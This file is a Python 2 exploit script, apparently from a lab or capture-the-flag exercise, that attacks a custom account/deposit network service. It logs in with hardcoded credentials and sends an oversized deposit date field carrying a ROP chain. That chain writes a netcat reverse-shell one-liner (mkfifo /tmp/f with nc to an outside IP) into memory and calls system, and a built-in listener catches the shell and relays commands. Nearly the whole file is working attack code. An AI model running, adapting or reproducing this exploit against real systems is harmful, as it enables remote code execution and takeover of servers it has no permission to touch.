import struct
import socket
import re
import threading
import sys
import os
import signal

pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

def connect(address):
  s = socket.socket()
  host = address # "172.17.0.2" #socket.gethostname()
  port = 6210
  s.connect((host, port))
  return s

def handle_connection(client):
  while True:
    sys.stdout.write(client.recv(1024))
    sys.stdout.flush()

def callback_server(ip, port):
  def inner():
    server = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((ip, port))
    server.listen(5)
    while True:
      client, addr = server.accept()
      print('[+] Accepted connection from: {}:{}'.format(addr[0], addr[1]))
      print('[+] q to quit')
      client_thread = threading.Thread(target=handle_connection, args=(client,))
      client_thread.start()
      while True:
        cmd = raw_input()
        if cmd == 'q':
            os.kill(os.getpid(), signal.SIGKILL)
        client.send(cmd + '\n')
  server_thread = threading.Thread(target=inner)
  server_thread.start()

def build_header(size, cmd):
  return struct.pack('II', size, cmd)

def build_login(username, password):
  body = struct.pack("BB", len(username), len(password)) + username + password
  return build_header(len(body), 0) + body

def build_leak():
  leak = "aaaa"+"%p."*16
  print leak
  body = struct.pack("B", len(leak)) + leak
  return build_header(len(body), 8) + body

def build_deposit(account_no, check, value, date):
  body = struct.pack("I", len(date)) + struct.pack("i", account_no) + struct.pack("i", check) + struct.pack("d", value) + date
  return build_header(len(body), 3) + body

def get_offset():
  print "getting offset"
  s = connect()
  s.send(build_login('1337', 'qwertyuiop'))
  s.send(build_deposit(0, 0, 0, pattern))
  s.close()
  print "Leaving get offset"

def exploit():
  import ipgetter
  IP = ipgetter.myip()
  print(IP)
  # address to send shell back to
  bind_ip = "0.0.0.0" #"0.0.0.0" #'172.17.0.2'
  bind_port = 6210

  # [1] get login credentials from client
  # 1337, and 23646

  
  # [2] brute force using common, first account they have access to
  #user = '1337'
  #password = 'qwertyuiop'
  
  # [3] pivot to credentials they need or create similar (priv 3)
  user = '2667'
  password = 'mynoob'
  
  # [4] get offset of corrupted stack
  # get string from stack in r2 at time of return that gives segfault
  #get_offset()
  #o2 = pattern.index("d7Ad8Ad9Ae0Ae1Ae")
  #print o2 # offset = 112
  offset = 112

  print "Listening On", bind_ip, bind_port
  callback_server(bind_ip, bind_port)
  
  # address from docker
  s = connect("172.17.0.2")
  s.send(build_login(user, password))
  
  # If PIE was enabled would need leak
  # send %p*24 and print reply
  #@   s.send(build_leak())
  #@   leaked_ptrs = s.recv(4096)

  # from here we observe offset, 2, 4, 6, 8, 10
  # getting offset from 2
  #  0x7f795cd9a390  - 0x7f795ce4c2c0, system - offset2 $2 = -728880
  # 0x7ffff73f9390 - 0x7ffff74ab2c0 $2 = -728880
  
  # Use jonthan salwan ropgadget, can find pieces
  # https://github.com/JonathanSalwan/ROPgadget#screenshots
  # ROPgadget --binary server | grep <gadget>
  # Without ASLR Works
    
  from struct import pack

  # Padding goes here
  p = 'a'*offset

  IP = "10.233.54.22"
  cmd = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' 
  cmd = cmd.format(IP, bind_port)
  
  # recalcualte gadgets if recompile

  needed = (8 - (len(cmd) % 8))
  cmd += '\x00' * needed
  split8 = re.findall('.'*8, cmd)
  start_addr = 0x00000000006d0240 # Write What Where gadget
  for part in split8:
    print part
    p += pack('<Q', 0x00000000004021ce) # pop rdi ; ret
    p += pack('<Q', start_addr)         # @ .data + i
    p += pack('<Q', 0x0000000000409073) # pop rax ; ret
    p += part                           # [rdi][i] = substring[:8]
    p += pack('<Q', 0x00000000004114c9) # mov qword ptr [rdi], rax ; ret
    start_addr += 8

    
  p += pack('<Q', 0x00000000004114c9) # mov qword ptr [rdi], rax ; ret
  
  # set up arg 1 for syscall  
  p += pack('<Q', 0x00000000004021ce) # pop rdi ; ret
  p += pack('<Q', 0x00000000006d0240) # @ .data
  p += pack('<Q', 0x0000000000401e89) # pop rsi ; ret
  p += pack('<Q', 0x00000000006d0248) # @ .data + 8
  p += pack('<Q', 0x00000000004bb28e) # pop rdx ; ret
  p += pack('<Q', 0x00000000006d0248) # @ .data + 8
  
  # Set up system call
  p += pack('<Q', 0x000000000040536e) # system
  s.send(build_deposit(0, 0, 0, p))
  
if __name__ == "__main__":
  exploit()
